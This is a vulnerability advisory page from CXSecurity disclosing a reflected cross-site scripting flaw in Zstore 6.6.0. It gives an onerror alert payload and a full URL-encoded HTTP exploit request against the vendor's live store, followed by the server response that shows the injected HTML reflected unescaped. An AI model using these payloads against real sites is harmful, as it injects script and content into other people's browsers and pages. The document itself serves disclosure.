---
title: Zstore 6.6.0 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2023020004
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-02
fetch_date: 2025-10-04T05:28:29.458891
---

# Zstore 6.6.0 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Zstore 6.6.0 Cross Site Scripting** **2023.02.01**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

## Title: zstore-6.6.0 - XSS-Reflected
## Development: nu11secur1ty
## Date: 01.29.2023
## Vendor: https://zippy.com.ua/
## Software: https://github.com/leon-mbs/zstore/releases/tag/6.5.4
## Reproduce: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/zippy/zstore-6.5.4
## Description:
The value of manual insertion `point 1` is copied into the HTML
document as plain text between tags.
The payload giflc<img src=a onerror=alert(1)>c0yu0 was submitted in
the manual insertion point 1.
This input was echoed unmodified in the application's response.
## STATUS: HIGH Vulnerability
[+] Exploit:
```GET
GET /index.php?p=%41%70%70%2f%50%61%67%65%73%2f%43%68%61%74%67%69%66%6c%63%3c%61%20%68%72%65%66%3d%22%68%74%74%70%73%3a%2f%2f%77%77%77%2e%79%6f%75%74%75%62%65%2e%63%6f%6d%2f%77%61%74%63%68%3f%76%3d%6d%68%45%76%56%39%51%37%7a%66%45%22%3e%3c%69%6d%67%20%73%72%63%3d%68%74%74%70%73%3a%2f%2f%6d%65%64%69%61%2e%74%65%6e%6f%72%2e%63%6f%6d%2f%2d%4b%39%73%48%78%58%41%62%2d%63%41%41%41%41%43%2f%73%68%61%6d%65%2d%6f%6e%2d%79%6f%75%2d%70%61%74%72%69%63%69%61%2e%67%69%66%22%3e%0a
HTTP/2
Host: store.zippy.com.ua
Cookie: PHPSESSID=f816ed0ddb0c43828cb387f992ac8521; last\_chat\_id=439
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="107", "Not=A?Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107
Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://store.zippy.com.ua/index.php?q=p:App/Pages/Main
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```
[+] Response:
```
HTTP/2 200 OK
Server: nginx
Date: Sun, 29 Jan 2023 07:27:55 GMT
Content-Type: text/html; charset=UTF-8
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-Ray: p529:0.010/wn19119:0.010/wa19119:D=12546
Class \App\Pages\Chatgiflc<a
href="https:\\www.youtube.com\watch?v=mhEvV9Q7zfE"><img
src=https:\\media.tenor.com\-K9sHxXAb-cAAAAC\shame-on-you-patricia.gif">
does not exist<br>82<br>/home/zippy00/zippy.com.ua/store/vendor/leon-mbs/zippy/core/webapplication.php<br>
```
## Proof and Exploit:
[href](https://streamable.com/aadj5c)
## Reference:
[href](https://portswigger.net/kb/issues/00200300\_cross-site-scripting-reflected)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020004)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top